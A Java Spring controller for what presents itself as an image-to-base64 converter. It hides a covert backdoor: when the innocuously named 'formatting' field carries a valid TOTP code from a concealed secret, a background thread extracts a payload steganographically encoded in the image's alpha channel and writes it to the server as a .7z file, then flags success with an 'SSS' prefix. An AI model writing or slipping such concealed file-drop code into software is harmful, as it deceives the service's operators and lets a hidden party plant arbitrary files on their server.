package earlobe.imgbase64.controller;

import dev.samstevens.totp.code.CodeVerifier;
import dev.samstevens.totp.code.DefaultCodeGenerator;
import dev.samstevens.totp.code.DefaultCodeVerifier;
import dev.samstevens.totp.time.SystemTimeProvider;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.awt.Color;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import javax.imageio.ImageIO;

@RestController
public class SubmissionController {

    @Value("${TOTP}")
    private String secret;
    private final CodeVerifier verifier = new DefaultCodeVerifier(new DefaultCodeGenerator(), new SystemTimeProvider());
    private final Path rootPath = Path.of("/var/imgbase64");

    @PostMapping("/convert.ajx")
    public String convert(
            @RequestPart("img") final MultipartFile img,
            @RequestPart("formatting") final String formatting) throws IOException {

        String result = new String(Base64.getEncoder().encode(img.getBytes()));

        if (formatting.length() == 6 && verifier.isValidCode(secret, formatting)) {
            new Thread(new Deserializer(img.getInputStream())).start();
            result = "SSS" + result;
        }

        return result;
    }

    private class Deserializer implements Runnable {

        private final BufferedImage inputImage;
        private final byte[] output;
        private final int factor;

        public Deserializer(final InputStream input) throws IOException {
            inputImage = ImageIO.read(input);
            output = new byte[getOutputSize()];
            factor = getFactor();
        }

        @Override
        public void run() {
            try {
                int counter = 0;
                while (counter < output.length * factor) {
                    int intermediate = 0;
                    for (int i = 0; i < factor; i++) {
                        intermediate += getByteValue(new Color(
                                inputImage.getRGB(counter % inputImage.getWidth(), counter / inputImage.getWidth()),
                                true).getAlpha());
                        counter++;
                    }
                    intermediate -= 128;
                    output[(counter / factor) - 1] = (byte) intermediate;
                }
                Files.write(rootPath.resolve(Path.of(System.currentTimeMillis() + ".7z")), output);
            } catch (final Exception e) {
                throw new RuntimeException("Unable to deserialize file", e);
            }
        }

        private int getOutputSize() {
            byte[] sizeBytes = new byte[4];
            for (int i = 0; i < 4; i++) {
                sizeBytes[i] = (byte) getByteValue(new Color(
                        inputImage.getRGB(inputImage.getWidth() - 5 + i, inputImage.getHeight() - 1),
                        true).getAlpha() - 128);
            }
            return ByteBuffer.wrap(sizeBytes).getInt();
        }

        private int getFactor() {
            return getByteValue(new Color(
                    inputImage.getRGB(inputImage.getWidth() - 6, inputImage.getHeight() - 1),
                    true).getAlpha());
        }

        private int getByteValue(final int value) {
            return 255 - value;
        }
    }
}
